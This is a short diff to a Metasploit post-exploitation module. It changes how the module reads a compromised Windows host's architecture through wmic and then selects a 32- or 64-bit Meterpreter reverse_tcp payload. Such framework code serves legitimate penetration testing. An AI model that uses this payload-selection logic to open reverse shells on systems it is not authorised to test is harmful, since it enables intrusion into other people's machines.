@@ -85,11 +85,11 @@ class MetasploitModule < Msf::Post
       platform = 'windows'
       lplat = [Msf::Platform::Windows]
       arch = cmd_exec('wmic os get osarchitecture')
-      if arch =~ /64-bit/m
+      if arch =~ /64/m && arch =~ /bit/m
         payload_name = 'windows/x64/meterpreter/reverse_tcp'
         larch = [ARCH_X64]
         psh_arch = 'x64'
-      elsif arch =~ /32-bit/m
+      elsif arch =~ /32/m && arch =~ /bit/m
         payload_name = 'windows/meterpreter/reverse_tcp'
         larch = [ARCH_X86]
         psh_arch = 'x86'
